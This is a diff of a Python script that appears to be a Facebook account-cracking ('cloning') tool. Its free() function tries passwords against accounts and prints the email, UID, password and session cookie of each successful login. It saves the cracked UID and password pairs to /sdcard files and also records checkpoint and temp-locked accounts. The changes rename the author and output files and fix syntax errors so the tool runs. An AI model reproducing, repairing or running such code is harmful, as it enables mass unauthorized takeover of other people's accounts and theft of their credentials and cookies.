@@ -9,7 +9,7 @@ try:
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python saran.py')
+    os.system('python Saran.py')
 from bs4 import BeautifulSoup
 ugen = []
 A = '\x1b[1;97m' 
@@ -71,7 +71,7 @@ def clear():
     os.system('clear')
     print(logo)
 logo =f"""____________________
-AUTHOR    : Saran Zaib
+AUTHOR    : Kandro
 FACEBOOK : Shah Zaib Kndro
 VERSION    : 1.1
                                    [THE DEAD USER]
@@ -232,7 +232,7 @@ def free(uid,pwx,tl):
                 cid = coki[7:22]
                 print('\r\033[1;32m[√]---------------------[JADU-OK]--------------------[√]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                 cek_apk(session,coki)
-                open('/sdcard/saran-OK.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/Saran-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
@@ -240,7 +240,7 @@ def free(uid,pwx,tl):
                 cid=coki[24:39]
                 Red = '\033[1;31m'
                 print(f'\r{Red}[×]--------------------[JADU-CP]---------------------[×]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
-                open('/', sdcard/saran.txt'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/Saran.txt', 'a').write(cid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             elif '/x/checkpoint' in log_cookies:
@@ -248,12 +248,12 @@ def free(uid,pwx,tl):
                 cid=coki[7:22]
                 Red = '\033[1;31m'
                 print(f'\r{YELLOW}[TEMP-LOCK] '+cid+' | '+ps+'\033[1;97m')
-                open('/sdcard/saran.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/saran-2F.txt', 'a').write(cid+' | '+ps+'\n')
                 twf.append(cid)
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[JADUGAR] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
+        sys.stdout.write(f'\r\33[1;37m[SARAN] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
         sys.stdout.flush()
         checks(oks,cps,twf)
     except:
@@ -261,5 +261,5 @@ def free(uid,pwx,tl):
 
         
  
-if __name__ == '__main__',
-(zeb)
+if __name__ == '__main__':
+    xyz()
